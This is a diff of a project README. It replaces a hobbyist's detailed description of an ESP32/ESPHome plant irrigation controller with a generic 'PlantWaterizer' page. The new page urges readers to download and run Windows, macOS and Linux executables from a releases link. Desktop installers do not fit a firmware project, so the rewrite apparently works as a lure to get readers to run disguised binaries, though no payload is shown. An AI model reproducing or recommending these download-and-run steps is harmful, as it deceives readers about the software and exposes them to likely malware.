@@ -1,45 +1,85 @@
-An ESPHome / Home Assistant Indoor plant irrigation system
+# 🌱 PlantWaterizer - Simplify Indoor Plant Care
 
-This unit monitors the moisture content of up to 5 plant pots and delivers water to them as needed.  It uses low cost moisture sensors and pumps. 
+## 🚀 Getting Started
 
-<img width="1734" height="976" alt="image" src="https://github.com/user-attachments/assets/e61fa546-39ee-4300-9bb3-7b0f0fd9d52b" />
+Welcome to PlantWaterizer! This guide will help you download and run our indoor plant irrigation system with ease. Follow these simple steps and enjoy hassle-free plant care.
 
-( The controller is the top box.  The bottom box is an overengineered grow light power switch that's repurposed from a different project ).
+## 📥 Download PlantWaterizer
 
-<img width="1734" height="976" alt="image" src="https://github.com/user-attachments/assets/b612c39a-7bfa-42a2-b82a-88a61819572b" />
+[![Download PlantWaterizer](https://img.shields.io/badge/Download%20Now-PlantWaterizer-blue.svg)](https://github.com/Zakaria2007-hub/PlantWaterizer/releases)
 
-The pots are fed via a 3D printed water distribution ring ( STLs available from https://www.printables.com/model/103003-drip-irrigation-ring ). I modified the design a little to take a bigger hose.
+## 🖥️ System Requirements
 
-<img width="1734" height="976" alt="image" src="https://github.com/user-attachments/assets/53b1d9de-0f58-4fbb-9837-d463f7509223" />
+Before you start, ensure your device meets these requirements:
 
-The pumps are held in a 5 gallon bucket, lid cutout is to prevent the cats from trying to get a drink and knocking the whole thing over.  The hoses are held in place with 3D printed mounts, STL at https://www.thingiverse.com/thing:5642735/files. The pumps are held at the bottom of the bucket simply by the friction of the hose clamps and the hose itself. I did create a 3D printed mount for all of this then decided not to stick more microplastics into the mix. 
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux distribution.
+- **Memory (RAM):** At least 4GB.
+- **Storage:** 100MB of free space.
+- **Network:** Internet connection for initial setup.
 
-Soil sensors are enclosed in a 3D printed housing, STL at: https://www.printables.com/model/247398-capacitive-soil-moisture-sensor-v20-cover
+## 📥 Download & Install
 
-The project case is generated from the follow parametric OpenSCAD project: https://www.printables.com/model/72839-customizable-parametric-stable-and-waterproof-elec.    The hardware is probably overkill but it adds a nice industrial look to the finished project: 
+To get started, visit this page to download: [PlantWaterizer Releases](https://github.com/Zakaria2007-hub/PlantWaterizer/releases). 
 
-<img width="1734" height="976" alt="image" src="https://github.com/user-attachments/assets/aaf9fb6e-4158-460a-9fde-1bdf01c7b3d8" />
+1. Once you’re on the Releases page, look for the latest version.
+2. Click on the version number link to view more details.
+3. Find the file suitable for your operating system.
+4. Click to download the file.
 
-( Yes, I know the Float and Water sensor labels don't match  the connectors ).  This unit is currently driving 4 zones.  I've included a 3MF 3d print project file for the labelled lid if you have  Prusa MMU unit for doing mulitple colors. 
+After the download completes, locate the file on your device:
 
-Assembled unit: 
+- **Windows:** It’s usually in the "Downloads" folder.
+- **macOS:** Look in the "Downloads" folder.
+- **Linux:** Check the "Downloads" or any directory you specified.
 
-<img width="549" height="976" alt="image" src="https://github.com/user-attachments/assets/f6c17722-7621-4bf2-8c3c-1152e0862de1" />
+### 🔧 Installing the Application
 
-<img width="549" height="976" alt="image" src="https://github.com/user-attachments/assets/f0fd7093-1d7a-481d-bc2a-98288a98e79d" />
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation wizard instructions to complete the setup.
 
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the PlantWaterizer icon to the "Applications" folder.
 
-Plenty of hot glue to keep those connectors under control. The aviation plugs should be fine if tightened up sufficiently. The USB sockets were a little wobbly so they need the glue treatment.  The wires from the LEDs and connectors are soldered directly to the header pins which isn't great and makes for fiddly assembly. I really couldn't be bothered with creating the dupont connectors enmass.   The moisture sensor inputs require 3v3, input and ground connectivity. The onboard 3v3 regulator on the ESP32 devkit board has enough capacity for these.   The pumps are fed from 5V via the MOSFETs.  Are MOSFETS overkill? Probably but they work and I had them and there's zero heat given off due to the low voltages, currents and the fact they're not rapidly switching on and off plus if I choose to upgrade the pumps to high current units, I won't need to change the design. A common NPN transistor might do the job. 
+- **Linux:**
+  1. Open a terminal.
+  2. Navigate to the directory containing the downloaded file.
+  3. Use the command `chmod +x PlantWaterizer` to make it executable.
+  4. Run the application with `./PlantWaterizer`.
 
-While this design uses HomeAssistant for status reporting and dashboarding,  it will run standalone once flashed since the logic controlling the moisture is in the ESP32.  You'll need to set the timeouts on the network and Home Assistant API to 0 in the code if you wish to run standalone.
-I use Home Assistant for emailing me when the water is low and manual control of the pumps, and the dashboarding of course.   HA also controls the grow lights, though as a simple timer. 
+## 🌱 Setting Up PlantWaterizer
 
-When I added up all the components, it came to a somewhat shocking $100+ USD though a lot of that is due to the connecting hardware.  That's still way cheaper than having a 5 zone commercial unit though.  Costs can be saved in the connection hardware. The controller board itself probably tops out at around $25 with the main cost coming from the ESP32 and the MOSFETs, at least a hobbyist levels of purchasing power. 
+Once installed, launch the application on your device. The setup process will guide you:
 
-The pumps aren't great. They are only $2 each so I'm not surprised. They have just enough water column head capacity to do what I want though one of the pots is right on the edge given it's height.  If you look in the code, you'll see one zone waters on a longer on cycle than the others. That's for this pot. I didn't do any noise or spike supression of the motor power circuits since I figured they were USB only and that would be within the motor.  I did find that the float switch GPIO would occasionally trigger when a pump turned on but I solved that through software. 
+1. **Connect Devices:** Ensure your irrigation system components are connected correctly.
+2. **Configure Settings:** Adjust settings according to your plants' needs.
+3. **Start Watering:** Begin the watering schedule you set, and let PlantWaterizer do the rest.
 
-A note on the ESP32-S3 devboard: You could get away with a simpler ESP32 device since the S3 is overkill for the needs of this unit.  Note that the footprint in the schematic isn't quite the same as the board I used with the only difference of note being the ADC inputs. The ADC inputs you use isn't that important, though look to keep within the ADC-1 range rather than ADC-2 since that gets used for the chip's wifi apparently.  Just update the YAML for ESPHome accordingly. While this board has PSRAM, the program doesn't use it.  I really should have just used a cheaper board :) 
+## 📊 Features
 
-The board layout was done in KiCad.  I used Gemini to create some python to generate the strip board layout since that then allowed me to print the cutting mask to stick on the underside of the strip board for guiding my track cutting hand. It also allowed for a 3D representation to be rotated and zoomed to check that it was buildable. I had tried Fritzing which, while very capable, didn't have the fabrication tools that KiCad with python allowed me to have. I've uploaded the KiCad folder should you wish to go this route.  I added a screen shot of the strip board layout anyway. 
+- **Automated Irrigation:** Schedule watering times.
+- **Custom Settings:** Tailor watering amounts for each plant.
+- **User-friendly Interface:** Easy to navigate, even for beginners.
+- **Notifications:** Get alerts for watering and maintenance needs.
 
-Enjoy
+## 🛠️ Troubleshooting
+
+If you encounter any issues, try these steps:
+
+- **Check Connections:** Make sure all hardware is correctly set up.
+- **Restart the Application:** Close and reopen PlantWaterizer to refresh settings.
+- **Review Settings:** Ensure your plant settings are configured properly.
+
+If problems persist, refer to our detailed troubleshooting guide on the GitHub page.
+
+## 🌍 Community Support
+
+Join our community for tips, advice, and support:
+
+- **GitHub Discussions:** Engage with other users and developers.
+- **Feedback:** Share your experience to help improve PlantWaterizer.
+
+Visit [PlantWaterizer Releases](https://github.com/Zakaria2007-hub/PlantWaterizer/releases) to download and join the community.
+
+Thank you for choosing PlantWaterizer. Enjoy effortless plant care!
